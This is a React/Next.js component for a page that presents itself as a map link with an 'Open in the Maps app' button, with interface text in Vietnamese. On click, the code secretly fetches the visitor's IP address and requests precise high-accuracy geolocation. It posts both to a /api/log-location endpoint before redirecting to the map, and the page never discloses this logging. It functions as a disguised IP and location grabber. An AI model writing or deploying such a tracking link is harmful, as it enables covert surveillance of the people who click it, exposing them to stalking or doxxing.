'use client';

import { useState } from 'react';
import Image from 'next/image';
import { Button } from '@/components/ui/button';
import { MapPin, ArrowUpRight, Loader2 } from 'lucide-react';
import type { MapLinkConfig } from '@/app/actions/map-links';

interface MapRedirectClientProps {
  redirectUrl: string;
  config: MapLinkConfig;
}

export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
  const [isLoading, setIsLoading] = useState(false);

  const handleOpenMap = () => {
    setIsLoading(true);

    const requestLocation = async () => {
      let clientIp = 'N/A';
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
          const ipData = await ipResponse.json();
          clientIp = ipData.ip;
        }
      } catch (e) {
        console.error("Could not fetch IP", e);
      }

      const logData = (pos?: GeolocationPosition) => {
        const body: { ip: string; lat?: number; lon?: number; acc?: number; from: string } = { ip: clientIp, from: 'link' };
        if (pos) {
          body.lat = pos.coords.latitude;
          body.lon = pos.coords.longitude;
          body.acc = pos.coords.accuracy;
        }

        fetch('/api/log-location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(body),
        }).finally(() => {
          window.location.href = redirectUrl;
        });
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          logData, // Success callback
          () => logData(), // Error callback
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        logData(); // Geolocation not supported
      }
    };
    
    // Slight delay to allow UI to update before potential blocking from geolocation prompt
    setTimeout(requestLocation, 100);
  };
  
  return (
    <div className="flex flex-col min-h-screen bg-background">
      {/* Image Header */}
      <div className="relative w-full h-60 sm:h-72 flex-shrink-0">
        <Image 
          src={config.imageUrl}
          alt={config.title}
          layout="fill"
          objectFit="cover"
          priority
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/60 to-transparent" />
      </div>

      {/* Content Body */}
      <div className="flex-grow flex flex-col">
        <div className="p-5 flex-grow">
          <div className="flex items-start gap-4">
              <div className="bg-muted/80 p-3 rounded-lg mt-1">
                  <MapPin className="h-6 w-6 text-foreground/80" />
              </div>
              <div>
                  <h1 className="text-xl font-bold text-foreground">{config.title}</h1>
                  <p className="text-sm text-muted-foreground mt-1">{config.description}</p>
              </div>
          </div>
        </div>
        
        {/* Footer Action Button */}
        <div className="bg-background p-4 border-t sticky bottom-0">
          <Button 
            className="w-full h-12 text-base font-semibold"
            onClick={handleOpenMap}
            disabled={isLoading}
          >
            {isLoading ? (
              <Loader2 className="mr-2 h-5 w-5 animate-spin" />
            ) : (
              <ArrowUpRight className="mr-2 h-5 w-5" />
            )}
            {isLoading ? 'Đang xử lý...' : 'Mở trong ứng dụng Bản đồ'}
          </Button>
        </div>
      </div>
    </div>
  );
}
